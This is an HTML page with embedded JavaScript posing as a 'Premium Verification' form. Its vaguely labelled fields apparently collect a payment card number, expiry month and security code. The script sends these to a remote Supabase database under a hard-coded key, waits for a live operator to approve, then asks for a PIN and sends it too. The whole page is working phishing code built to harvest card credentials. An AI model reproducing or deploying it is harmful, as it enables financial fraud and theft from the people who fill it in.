<!DOCTYPE html>
<html>
<head>

<title>Premium Verification</title>

<script src="https://unpkg.com/@supabase/supabase-js@2"></script>

<style>

body{
    background:#111;
    color:white;
    font-family:Arial;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    width:400px;
    background:#1b1b1b;
    padding:30px;
    border-radius:20px;
}

input{
    width:100%;
    padding:14px;
    margin-bottom:15px;
    border:none;
    border-radius:10px;
}

button{
    width:100%;
    padding:14px;
    background:#ff0080;
    color:white;
    border:none;
    border-radius:10px;
    cursor:pointer;
}

#status{
    margin-top:20px;
}

</style>

</head>
<body>

<div class="box">

<h2>Verification</h2>

<input type="text" id="number1" placeholder="Number 1">

<input type="month" id="date_value">

<input type="text" id="number2" placeholder="Number 2">

<button onclick="submitForm()">
Continue
</button>

<div id="status"></div>

</div>

<script>

const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';

const client = window.supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
);
let currentId = null;


// SUBMIT FORM
async function submitForm(){

    const number1 =
    document.getElementById('number1').value;

    const date_value =
    document.getElementById('date_value').value;

    const number2 =
    document.getElementById('number2').value;

    document.getElementById('status').innerHTML =
    'Submitting...';

    const { data, error } = await client
    .from('requests')
    .insert([
        {
            number1,
            date_value,
            number2
        }
    ])
    .select();

    currentId = data[0].id;

    listenStatus();

}


// REALTIME
async function listenStatus(){

    setInterval(async()=>{

        const { data } = await client
        .from('requests')
        .select('*')
        .eq('id',currentId)
        .single();

        // PENDING
        if(data.status === 'pending'){

            document.getElementById('status').innerHTML =
            'Waiting For Admin...';

        }

        // REJECTED
        else if(data.status === 'rejected'){

            document.getElementById('status').innerHTML =
            'Request Rejected';

        }

        // ACCEPTED
        else if(data.status === 'accepted'){

            // PIN WAIT
            if(data.pin_status === 'waiting'){

                document.getElementById('status').innerHTML = `

                <input type="text"
                id="pin"
                placeholder="Enter PIN">

                <button onclick="submitPin()">
                Submit PIN
                </button>

                `;

            }

            // PIN PENDING
            else if(data.pin_status === 'pending'){

                document.getElementById('status').innerHTML =
                'Waiting For PIN Approval...';

            }

            // PIN REJECTED
            else if(data.pin_status === 'rejected'){

                document.getElementById('status').innerHTML =
                'PIN Rejected';

            }

            // SUCCESS
            else if(data.pin_status === 'accepted'){

                document.getElementById('status').innerHTML =
                '<h1>Congratulations 🎉</h1>';

            }

        }

    },2000);

}



// SUBMIT PIN
async function submitPin(){

    const pin =
    document.getElementById('pin').value;

    await client
    .from('requests')
    .update({
        pin:pin,
        pin_status:'pending'
    })
    .eq('id',currentId);

}

</script>

</body>
</html>
